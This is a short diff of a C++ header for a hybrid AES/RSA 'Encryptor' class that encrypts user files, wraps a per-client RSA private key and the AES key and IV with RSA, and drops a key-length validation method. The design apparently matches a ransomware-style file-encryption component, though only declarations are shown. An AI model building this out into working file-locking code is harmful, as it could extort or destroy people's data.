@@ -19,23 +19,17 @@ namespace hybrid
 {
 
 /**
- * Class Encryptor to encrypt files with AES, CPrivateRSA and AESKeyPair(Key+IV) with RSA
+ * Class Encryptor to encrypt user files with AES. The CPrivateRSA and AESKeyPair(Key+IV) with RSA
  */
 class Encryptor
 {
 
 private:
     int _keySize;
-    bool _aesKeyInit;
     std::vector<std::thread> _threads;
 
     std::unique_ptr<rsa::RSAEncryptor> _rsaEncryptorAESKey, _rsaEncryptorCPrivateRSA;
     std::unique_ptr<aes::AESEncryptor> _aesEncryptor;
-
-    /**
-     * Validates the AESKey/AESIV length after the AESKey generation
-     */
-    void validateAESKeyLength();
 
     /**
      * Saves the unencrypted AESKeyPair to the filesystem
